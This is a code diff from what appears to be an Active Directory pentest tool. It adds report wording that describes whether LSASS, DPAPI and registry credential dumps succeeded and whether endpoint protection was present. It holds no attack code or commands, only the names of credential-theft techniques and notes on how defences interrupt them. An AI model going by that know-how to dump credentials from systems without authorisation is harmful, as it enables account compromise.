         target_label = str(step.get("target") or step.get("to") or "").strip()
     try:
@@ -9028,7 +9842,10 @@ def render_step_remediation(step: dict[str, Any]) -> list[str]:
         """
         if not _rem_domain:
             return lines
-        return [re.sub(r"<domain>", _rem_domain, line, flags=re.IGNORECASE) for line in lines]
+        return [
+            re.sub(r"<domain>", _rem_domain, line, flags=re.IGNORECASE)
+            for line in lines
+        ]
 
     def _clean_bullet(value: Any) -> str:
         # VULN_CATALOG remediation lines carry a literal "[bullet] " marker; the
@@ -9078,10 +9895,13 @@ def render_step_remediation(step: dict[str, Any]) -> list[str]:
     # MANAGEABLE group (Backup Operators, a custom Tier-2 group) keeps the standard
     # remove-from advice below, so least-privilege is never weakened for a group
     # that genuinely has an editable membership.
-    if _is_membership_relation(str(relation_raw)) and _step_target_is_dynamic_identity(step):
+    if _is_membership_relation(str(relation_raw)) and _step_target_is_dynamic_identity(
+        step
+    ):
         placeholders = _extract_step_placeholders(step)
         return [
-            line.format(**placeholders) for line in _DYNAMIC_IDENTITY_MEMBERSHIP_REMEDIATION
+            line.format(**placeholders)
+            for line in _DYNAMIC_IDENTITY_MEMBERSHIP_REMEDIATION
         ]
 
     if entry.remediation_steps:
@@ -9234,6 +10054,69 @@ def _lsass_posture_state_key(
     return "none_observed"
 
 
+def _render_two_state_posture_context(
+    step: dict[str, Any], *, outcome_field: str, phrases: dict[str, str]
+) -> str:
+    """Render a two-state (succeeded / attempted) posture sentence.
+
+    The shared core of the LSASS and DPAPI renderers, which ask the SAME
+    question of the SAME stamped fields and differ only in which outcome key
+    they read and which authored matrix they draw from. The registry renderer
+    deliberately does NOT use this: it carries an extra dimension (which
+    backend produced the result, and whether the inline retry was exhausted)
+    that neither of the other two has, and forcing all three through one
+    signature would be an abstraction over shapes that are genuinely
+    different.
+
+    Honesty invariants, identical for every caller:
+      - SUCCEEDED x POSTURE_UNKNOWN renders "": posture was not assessed, so
+        there is nothing honest to state about defense.
+      - A DID_NOT_COMPLETE cell never uses a causation verb and always carries
+        the "not conclusively determined" lead.
+      - ``posture_assessed`` false forces the UNKNOWN branch whatever the
+        product lists say, because an incomplete scan is not evidence of
+        absence.
+      - A product-bearing cell with no product name degrades to the neutral
+        wording rather than emitting a literal placeholder.
+
+    Best-effort: returns "" on any missing or malformed field, so a step that
+    was never stamped renders nothing rather than a fabricated claim.
+    """
+    if not isinstance(step, dict):
+        return ""
+    details = step.get("details") if isinstance(step.get("details"), dict) else {}
+    if not isinstance(details, dict):
+        return ""
+    outcome_raw = str(details.get(outcome_field) or "").strip().lower()
+    if outcome_raw not in ("succeeded", "attempted"):
+        return ""
+    posture_assessed = bool(details.get("posture_assessed"))
+    edr_active = bool(details.get("edr_active"))
+    av_active = bool(details.get("av_active"))
+    posture_key = _lsass_posture_state_key(edr_active, av_active, posture_assessed)
+
+    if outcome_raw == "succeeded" and posture_key == "posture_unknown":
+        return ""
+
+    template = phrases.get(f"{outcome_raw}__{posture_key}")
+    if not template:
+        return ""
+    if "{product}" not in template:
+        return template
+
+    products = details.get("endpoint_products")
+    names = [
+        str(name).strip()
+        for name in (products if isinstance(products, (list, tuple)) else [])
+        if str(name).strip()
+    ]
+    product_display = ", ".join(names) if names else "endpoint protection"
+    try:
+        return template.format(product=product_display)
+    except (KeyError, IndexError):
+        return template.replace("{product}", product_display)
+
+
 def render_lsass_posture_context(step: dict[str, Any]) -> str:
     """Render the defensive-posture context sentence for a DumpLSASS step.
 
@@ -9253,33 +10136,297 @@ def render_lsass_posture_context(step: dict[str, Any]) -> str:
     Best-effort: returns ``""`` on any missing/malformed field so a step that
     was never stamped renders nothing rather than a bogus claim.
     """
+    return _render_two_state_posture_context(
+        step, outcome_field="lsass_dump_outcome", phrases=_LSASS_POSTURE_PHRASES
+    )
+
+
+# ---------------------------------------------------------------------------
+# DPAPI defensive-posture context (DumpDPAPI steps) — EXPOSURE VALIDATION.
+#
+# The same question the LSASS matrix asks, of the same stamped fields, so it
+# shares that renderer's core and differs only in its prose. A DPAPI read
+# recovers the master keys and the secrets they protect, which is what the
+# sentences name.
+#
+# Partial recovery (some master keys decrypted, others still locked) is NOT a
+# third outcome here. It is coverage of the dump, which the dump's own
+# reporting already states, and the posture question is unchanged: if any
+# material came out, the exposure is proven. Inventing a third state would add
+# a vocabulary the other techniques do not have and an honesty rule nobody
+# needs.
+# ---------------------------------------------------------------------------
+
+_DPAPI_DID_NOT_COMPLETE_LEAD = (
+    "The DPAPI-protected secret read did not complete on this host; the cause "
+    "was not conclusively determined."
+)
+
+_DPAPI_POSTURE_PHRASES: dict[str, str] = {
+    # ── SUCCEEDED × observed posture — assert the PROVEN positive fact ──────
+    "succeeded__edr_av_active": (
+        "Endpoint protection was active on this host (endpoint detection and "
+        "response ({product}) alongside antivirus), and the DPAPI master keys "
+        "and the secrets they protect were recovered regardless."
+    ),
+    "succeeded__edr_only": (
+        "Endpoint detection and response ({product}) was active on this host, "
+        "and the DPAPI master keys and the secrets they protect were recovered "
+        "regardless."
+    ),
+    "succeeded__av_only": (
+        "Antivirus ({product}) was active on this host with no endpoint "
+        "detection and response observed, and the DPAPI master keys and the "
+        "secrets they protect were recovered."
+    ),
+    "succeeded__none_observed": (
+        "No endpoint protection was observed on this host, and the DPAPI "
+        "master keys and the secrets they protect were recovered."
+    ),
+    # SUCCEEDED × POSTURE_UNKNOWN emits NO sentence (see the shared render
+    # core): endpoint posture was not assessed, so there is nothing honest to
+    # state.
+    # ── DID_NOT_COMPLETE × observed posture — two facts side by side, ZERO cause ─
+    # Plain (non-f) strings: ``{product}`` MUST survive as a literal
+    # placeholder for ``str.format`` at render time.
+    "attempted__edr_av_active": (
+        _DPAPI_DID_NOT_COMPLETE_LEAD + " Endpoint protection was active here "
+        "(endpoint detection and response ({product}) alongside antivirus), "
+        "recorded as context, not as the cause."
+    ),
+    "attempted__edr_only": (
+        _DPAPI_DID_NOT_COMPLETE_LEAD + " Endpoint detection and response "
+        "({product}) was active here, recorded as context, not as the cause."
+    ),
+    "attempted__av_only": (
+        _DPAPI_DID_NOT_COMPLETE_LEAD + " Antivirus ({product}) was active "
+        "here, recorded as context, not as the cause."
+    ),
+    "attempted__none_observed": (
+        _DPAPI_DID_NOT_COMPLETE_LEAD + " No endpoint protection was observed here."
+    ),
+    # DID_NOT_COMPLETE × POSTURE_UNKNOWN — the neutral outcome-only fallback.
+    "attempted__posture_unknown": _DPAPI_DID_NOT_COMPLETE_LEAD,
+}
+
+
+def render_dpapi_posture_context(step: dict[str, Any]) -> str:
+    """Render the defensive-posture context sentence for a DumpDPAPI step.
+
+    Reads the fields stamped at the DPAPI dump seam
+    (``dpapi_dump_outcome`` / ``edr_active`` / ``av_active`` /
+    ``endpoint_products`` / ``posture_assessed``) through the shared two-state
+    core, so the honesty invariants are the LSASS renderer's, not a third copy
+    of them. Returns "" for a step that carries no posture stamp.
+
+    This existed for LSASS and for the registry reads and not for DPAPI, which
+    meant a real DumpDPAPI edge in a client engagement carried no posture
+    sentence while its siblings did. The data was already being stamped for the
+    attempt ledger; only the authored sentence was missing.
+    """
+    return _render_two_state_posture_context(
+        step, outcome_field="dpapi_dump_outcome", phrases=_DPAPI_POSTURE_PHRASES
+    )
+
+
+# ---------------------------------------------------------------------------
+# Registry-secrets defensive-posture context (DumpLSA / DumpSAM /
+# BackupOperatorDump steps) — EXPOSURE VALIDATION. Mirrors the LSASS matrix
+# above field-for-field (same honesty invariants, same absence-trap guard,
+# same "recorded as context, not as the cause" framing). See
+# adscan-obsidian/business/12_nomenclature_standard.md § "Interferencia
+# defensiva durante un dump de credenciales" for the doctrine this
+# implements: presence of a client security product is a FACT (named when
+# confirmed by fingerprinting); causation of a specific non-completion is
+# NEVER asserted, only offered as a correlation task for the client's own
+# console.
+#
+# Two things this matrix adds beyond the LSASS shape, both unique to the
+# registry read and both STRUCTURAL facts (never inferred):
+#   - the ACCESS METHOD that produced a successful result (``source_method``
+#     -- "inline", no disk artifact, vs "savekey", a hive written to disk);
+#   - whether the inline method's one-shot retry was ALSO interrupted by a
+#     transient pipe teardown before this result was produced
+#     (``inline_retry_exhausted`` -- the exact SMB status code observed
+#     twice on the SAME sensitive read, not a heuristic error-string match).
+# ---------------------------------------------------------------------------
+
+_REGISTRY_DID_NOT_COMPLETE_LEAD = (
+    "The registry-protected credential read did not complete on this host; "
+    "the cause was not conclusively determined."
+)
+
+_REGISTRY_POSTURE_PHRASES: dict[str, str] = {
+    "succeeded__edr_av_active": (
+        "Endpoint protection was active on this host (endpoint detection and "
+        "response ({product}) alongside antivirus), and the credentials were "
+        "recovered regardless."
+    ),
+    "succeeded__edr_only": (
+        "Endpoint detection and response ({product}) was active on this host, "
+        "and the credentials were recovered regardless."
+    ),
+    "succeeded__av_only": (
+        "Antivirus ({product}) was active on this host with no endpoint "
+        "detection and response observed, and the credentials were recovered."
+    ),
+    "succeeded__none_observed": (
+        "No endpoint protection was observed on this host, and the "
+        "credentials were recovered."
+    ),
+    # SUCCEEDED x POSTURE_UNKNOWN emits no sentence — see the render helper.
+    "attempted__edr_av_active": (
+        _REGISTRY_DID_NOT_COMPLETE_LEAD + " Endpoint protection was active "
+        "here (endpoint detection and response ({product}) alongside "
+        "antivirus), recorded as context, not as the cause."
+    ),
+    "attempted__edr_only": (
+        _REGISTRY_DID_NOT_COMPLETE_LEAD + " Endpoint detection and response "
+        "({product}) was active here, recorded as context, not as the cause."
+    ),
+    "attempted__av_only": (
+        _REGISTRY_DID_NOT_COMPLETE_LEAD + " Antivirus ({product}) was "
+        "active here, recorded as context, not as the cause."
+    ),
+    "attempted__none_observed": (
+        _REGISTRY_DID_NOT_COMPLETE_LEAD + " No endpoint protection was observed here."
+    ),
+    "attempted__posture_unknown": _REGISTRY_DID_NOT_COMPLETE_LEAD,
+}
+
+# Basis + verification for an interference that CAN be assessed, i.e. a
+# repeated interruption on the sensitive read while a product's presence was
+# independently confirmed by fingerprinting. Two observed facts (the product
+# is active; the interruption recurred and struck only the credential stage)
+# support a named-confidence assessment. That is a different claim from
+# crediting a control we never observed, which stays forbidden: a host with
+# NO confirmed product keeps the neutral wording, because a transient service
+# fault produces the same broken pipe.
+_REGISTRY_ASSESSED_INTERFERENCE_BASIS = (
+    "ADscan assesses with high confidence that this host's endpoint protection "
+    "interrupted the read: the interruption recurred across every retry and "
+    "struck only the credential-bearing stage, which is the signature of "
+    "endpoint interception rather than a transient fault. Where more than one "
+    "product is active, which of them acted is not determined."
+)
+
+_REGISTRY_ASSESSED_INTERFERENCE_VERIFY = (
+    "Correlate this host and timeframe in your own console. A detection "
+    "there confirms the control worked as intended; its absence means the "
+    "read was interrupted without being recorded, which is itself a gap "
+    "worth investigating."
+)
+
+# ATTEMPTED x confirmed-active-product x repeated interruption. Replaces the
+# generic attempted lead outright rather than appending to it: that lead says
+# the cause was not conclusively determined and the posture clause says the
+# product is "context, not the cause", so appending a high-confidence
+# assessment would produce a paragraph that argues with itself.
+_REGISTRY_ATTEMPTED_ASSESSED_PHRASES: dict[str, str] = {
+    "edr_av_active": (
+        "The registry-protected credential read did not complete on this "
+        "host. Endpoint protection was active throughout (endpoint detection "
+        "and response ({product}) alongside antivirus), and the pipe "
+        "carrying the read was repeatedly interrupted while retrieving "
+        "credential material. "
+        + _REGISTRY_ASSESSED_INTERFERENCE_BASIS
+        + " "
+        + _REGISTRY_ASSESSED_INTERFERENCE_VERIFY
+    ),
+    "edr_only": (
+        "The registry-protected credential read did not complete on this "
+        "host. Endpoint detection and response ({product}) was active "
+        "throughout, and the pipe carrying the read was repeatedly "
+        "interrupted while retrieving credential material. "
+        + _REGISTRY_ASSESSED_INTERFERENCE_BASIS
+        + " "
+        + _REGISTRY_ASSESSED_INTERFERENCE_VERIFY
+    ),
+    "av_only": (
+        "The registry-protected credential read did not complete on this "
+        "host. Antivirus ({product}) was active throughout, and the pipe "
+        "carrying the read was repeatedly interrupted while retrieving "
+        "credential material. "
+        + _REGISTRY_ASSESSED_INTERFERENCE_BASIS
+        + " "
+        + _REGISTRY_ASSESSED_INTERFERENCE_VERIFY
+    ),
+}
+
+_REGISTRY_SOURCE_METHOD_CLAUSES: dict[str, str] = {
+    "inline": " The credentials were recovered via the inline registry read (no disk artifact).",
+    "savekey": " The credentials were recovered via the registry hive export method (the hive was written to disk during the read).",
+}
+
+
+def _registry_posture_state_key(
+    edr_active: bool, av_active: bool, posture_assessed: bool
+) -> str:
+    """Map the stamped posture booleans to a matrix posture-state key.
+
+    Identical logic to ``_lsass_posture_state_key`` — kept as a separate
+    function (not shared) so the two matrices can diverge independently
+    without one accidentally changing the other's behaviour.
+    """
+    if not posture_assessed:
+        return "posture_unknown"
+    if edr_active and av_active:
+        return "edr_av_active"
+    if edr_active:
+        return "edr_only"
+    if av_active:
+        return "av_only"
+    return "none_observed"
+
+
+def render_registry_posture_context(step: dict[str, Any]) -> str:
+    """Render the defensive-posture context sentence for a registry-secrets
+    step (DumpLSA / DumpSAM / BackupOperatorDump).
+
+    Reads the posture fields stamped onto the step's ``details`` at the
+    registry-secrets dump seam (``registry_dump_outcome`` / ``edr_active`` /
+    ``av_active`` / ``endpoint_products`` / ``posture_assessed`` /
+    ``source_method`` / ``inline_retry_exhausted``), computes the matrix
+    cell, and returns the authored client-safe sentence — or ``""`` when
+    the step carries no posture (a posture-unblind step never emits a
+    claim).
+
+    Honesty invariants (mirrors
+    ``tests/unit/services/test_lsass_posture_narrative.py``'s pattern):
+      - SUCCEEDED x POSTURE_UNKNOWN -> ``""`` (nothing to say about
+        defense) UNLESS ``inline_retry_exhausted`` is set, in which case the
+        interference clause alone still renders (it is not a posture claim
+        about the fingerprinted product — it is an observed repeated
+        interruption on the SAME sensitive read, independently true of
+        whether posture was fingerprinted at all).
+      - DID_NOT_COMPLETE cells never use a causation verb and always carry
+        the "not conclusively determined" disclaimer.
+      - ``posture_assessed`` false forces the UNKNOWN branch regardless of
+        the product lists.
+      - A product is named ONLY when ``posture_assessed`` is True AND that
+        category is active — never from the interference signal alone (the
+        interference clause stays product-silent when posture was not
+        fingerprinted, per the two-axes doctrine: presence is a fact only
+        when independently confirmed).
+
+    Best-effort: returns ``""`` on any missing/malformed field so a step
+    that was never stamped renders nothing rather than a bogus claim.
+    """
     if not isinstance(step, dict):
         return ""
     details = step.get("details") if isinstance(step.get("details"), dict) else {}
     if not isinstance(details, dict):
         return ""
-    outcome_raw = str(details.get("lsass_dump_outcome") or "").strip().lower()
+    outcome_raw = str(details.get("registry_dump_outcome") or "").strip().lower()
     if outcome_raw not in ("succeeded", "attempted"):
-        # Not a stamped DumpLSASS step (or an unexpected token) — no claim.
+        # Not a stamped registry-secrets step (or an unexpected token) — no claim.
         return ""
     posture_assessed = bool(details.get("posture_assessed"))
     edr_active = bool(details.get("edr_active"))
     av_active = bool(details.get("av_active"))
-    posture_key = _lsass_posture_state_key(edr_active, av_active, posture_assessed)
-
-    # SUCCEEDED × POSTURE_UNKNOWN: the base narrative stands alone, no posture
-    # claim (endpoint posture was not assessed on this host).
-    if outcome_raw == "succeeded" and posture_key == "posture_unknown":
-        return ""
-
-    cell_key = f"{outcome_raw}__{posture_key}"
-    template = _LSASS_POSTURE_PHRASES.get(cell_key)
-    if not template:
-        return ""
-
-    if "{product}" not in template:
-        # NONE_OBSERVED / UNKNOWN cells carry no product token.
-        return template
+    inline_retry_exhausted = bool(details.get("inline_retry_exhausted"))
+    source_method = str(details.get("source_method") or "").strip().lower()
+    posture_key = _registry_posture_state_key(edr_active, av_active, posture_assessed)
 
     products = details.get("endpoint_products")
     names = [
@@ -9287,17 +10434,70 @@ def render_lsass_posture_context(step: dict[str, Any]) -> str:
         for name in (products if isinstance(products, (list, tuple)) else [])
         if str(name).strip()
     ]
-    if not names:
-        # A product-bearing cell with no product name to fill would leave a
-        # literal placeholder — never emit that. Degrade to a neutral,
-        # product-free phrase so the sentence stays honest and complete.
-        product_display = "endpoint protection"
-    else:
-        product_display = ", ".join(names)
-    try:
-        return template.format(product=product_display)
-    except (KeyError, IndexError):
-        return template.replace("{product}", product_display)
+    product_display = ", ".join(names) if names else "endpoint protection"
+
+    def _fill(template: str) -> str:
+        if "{product}" not in template:
+            return template
+        try:
+            return template.format(product=product_display)
+        except (KeyError, IndexError):
+            return template.replace("{product}", product_display)
+
+    # A product whose presence was independently confirmed, plus a repeated
+    # interruption on the sensitive read, is the one combination that
+    # supports a named-confidence assessment. It gets its own coherent
+    # paragraph instead of the generic lead plus an appended clause.
+    product_confirmed_active = posture_assessed and (edr_active or av_active)
+    if (
+        outcome_raw == "attempted"
+        and inline_retry_exhausted
+        and product_confirmed_active
+    ):
+        assessed = _REGISTRY_ATTEMPTED_ASSESSED_PHRASES.get(posture_key)
+        if assessed:
+            return _fill(assessed)
+
+    sentence = ""
+    # SUCCEEDED x POSTURE_UNKNOWN: the base narrative stands alone, no
+    # posture claim — same rule as LSASS.
+    if not (outcome_raw == "succeeded" and posture_key == "posture_unknown"):
+        cell_key = f"{outcome_raw}__{posture_key}"
+        template = _REGISTRY_POSTURE_PHRASES.get(cell_key)
+        if template:
+            sentence = _fill(template)
+
+    if outcome_raw == "succeeded" and source_method in _REGISTRY_SOURCE_METHOD_CLAUSES:
+        sentence = (sentence + _REGISTRY_SOURCE_METHOD_CLAUSES[source_method]).strip()
+
+    if inline_retry_exhausted:
+        # The interference clause is INDEPENDENT of whether posture was
+        # fingerprinted — it reports an observed repeated interruption on
+        # the sensitive read, and names the client's product only when its
+        # presence was independently confirmed (posture_assessed AND
+        # active). Never attributes causation.
+        if product_confirmed_active:
+            # Reached when the read SUCCEEDED despite the interruption (the
+            # attempted case returned its own paragraph above). The product
+            # interfered and the credentials came out anyway, which is the
+            # most useful thing the client can learn here.
+            interference = (
+                f" The pipe used for this read was repeatedly interrupted "
+                f"while retrieving credential material, with "
+                f"{product_display} active on this host throughout. "
+                + _REGISTRY_ASSESSED_INTERFERENCE_BASIS
+                + " "
+                + _REGISTRY_ASSESSED_INTERFERENCE_VERIFY
+            )
+        else:
+            interference = (
+                " The pipe used for this read was repeatedly interrupted "
+                "while retrieving credential material, for a cause not "
+                "conclusively determined."
+            )
+        sentence = (sentence + interference).strip()
+
+    return sentence
 
 
 def resolve_technique_prose(vuln_key: str | None) -> dict[str, Any]:
@@ -9441,7 +10641,10 @@ _STATUS_PHRASE: dict[str, str] = {
     "attempted": "was probed but not fully executed in the engagement window",
     # A "blocked" path is one ADscan withheld from live execution for safety (a
     # destructive/disruptive technique). Never phrased as "a control stopped it" —
-    # ADscan validates exposure, not defensive tooling.
+    # ADscan validates exposure, not defensive tooling. This is the
+    # position-blind fallback; a path carrying the safety MARKER gets one of the
+    # two position-specific phrases below instead, because a terminal and a
+    # mid-chain abstention are different stories.
     "blocked": "was withheld from live execution as a safety precaution",
     "closed_by_configuration": (
         "targets an avenue your environment's configuration already closes"
@@ -9460,6 +10663,25 @@ _STATUS_PHRASE: dict[str, str] = {
         "available to test the avenue"
     ),
     "theoretical": "is a theoretical route derived from configuration analysis",
+}
+
+#: Position-specific phrasing for a route carrying the safety marker. The status
+#: token says WHAT ADscan decided; these say WHERE the decision fell, which is
+#: the difference between a route whose only unexecuted act is its last one and a
+#: route nobody walked past the middle. Neither claims the chain was validated:
+#: on a real route the hops before the withheld one are frequently derived from
+#: configuration too, so "validated up to" would be an overclaim.
+_SAFETY_ABSTENTION_POSITION_PHRASE: dict[str, str] = {
+    "terminal": (
+        "ends at a step ADscan deliberately did not execute, because running it "
+        "would disrupt production. Only that final act was declined, so the "
+        "exposure stands"
+    ),
+    "mid_chain": (
+        "passes through a step ADscan deliberately did not execute, because "
+        "running it would disrupt production, so the hops beyond that point were "
+        "not walked"
+    ),
 }
 
 
@@ -9561,6 +10783,24 @@ def render_path_summary(path: dict[str, Any], domain: str = "") -> str:
     step_count = len([s for s in steps if isinstance(s, (dict, str))])
     step_word = "step" if step_count == 1 else "steps"
     status_phrase = _STATUS_PHRASE.get(status_raw, _STATUS_PHRASE["theoretical"])
+    if status_raw == "blocked":
+        # Reconcile the sentence with the badge. A ``blocked`` path carrying the
+        # safety marker is restraint, and the phrase states WHERE the withheld
+        # step sits. A ``blocked`` path with NO marker is not restraint at all:
+        # ADscan never attributes a non-execution to a control in the client's
+        # environment, so it reads as an execution that did not complete, the
+        # same answer the display bucket and the chip give it.
+        from adscan_internal.services.destructive_action_policy import (  # noqa: PLC0415
+            safety_abstention_position,
+        )
+
+        position = safety_abstention_position(path)
+        if position:
+            status_phrase = _SAFETY_ABSTENTION_POSITION_PHRASE.get(
+                position, _STATUS_PHRASE["blocked"]
+            )
+        else:
+            status_phrase = _STATUS_PHRASE["attempted"]
 
     source_phrase = source if source_is_placeholder else source
     target_phrase = target if target_is_placeholder else target
